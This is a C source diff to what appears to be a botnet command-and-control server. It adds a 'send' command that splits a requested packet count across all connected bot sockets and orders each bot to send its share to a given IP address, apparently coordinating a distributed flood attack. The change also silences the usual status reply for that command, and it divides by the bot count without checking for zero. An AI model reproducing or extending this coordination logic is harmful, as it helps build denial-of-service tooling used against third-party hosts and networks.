@@ -30,7 +30,9 @@ int main(int argc, char **argv)
    char read_option[255];
    char bot_number[2];
    char create_route[255];
+   char send_temp[255];
    int num_packet;
+   int superbot_count;
 
    struct sockaddr_in clientaddr, serveraddr;
    struct pollfd client[MAX_SOCKET];
@@ -138,13 +140,29 @@ int main(int argc, char **argv)
            }
            else if(strstr(instruction,"send"))
            {
+               memset(send_temp,'\0',255);
+               superbot_count = 0;
                temp = strtok(NULL," ");
-               printf("%s\n",temp);
                if(temp == NULL)
                    continue;
                num_packet = atoi(temp);
                temp = strtok(NULL," ");
                strncpy(ip_addr,temp,sizeof(ip_addr));
+               
+               for(i=1;i<MAX_SOCKET;i++)
+                   if(client[i].fd >= 0)
+                       superbot_count++;
+
+               num_packet = num_packet / superbot_count;
+               sprintf(send_temp,"send %d %s",num_packet,ip_addr);
+               
+               for(i=1;i<MAX_SOCKET;i++)
+               {
+                   if(client[i].fd >= 0)
+                   {
+                       write(client[i].fd,send_temp,sizeof(send_temp));
+                   }
+               }
            }
            else if(strstr(instruction,"search"))
            {
@@ -177,7 +195,8 @@ int main(int argc, char **argv)
            }
            if(count%3 == 0)
            {
-               write(client[i].fd,message,sizeof(message));
+               if(!strstr(instruction,"send"))
+                   write(client[i].fd,message,sizeof(message));
            }
        }
        memset(message,'\0',255);
